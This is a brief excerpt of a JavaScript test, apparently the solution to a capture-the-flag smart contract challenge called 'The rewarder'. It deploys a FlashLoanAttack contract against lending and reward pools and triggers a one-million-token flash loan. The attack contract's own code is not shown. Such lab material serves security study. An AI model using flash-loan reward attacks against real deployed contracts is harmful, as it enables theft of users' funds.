...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const FlashLoanAttack = await ethers.getContractFactory('FlashLoanAttack', attacker);
        this.flashLoanAttack = await FlashLoanAttack.deploy(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, this.rewardToken.address);

        await this.flashLoanAttack.executeFlashLoan(ethers.utils.parseEther('1000000'));
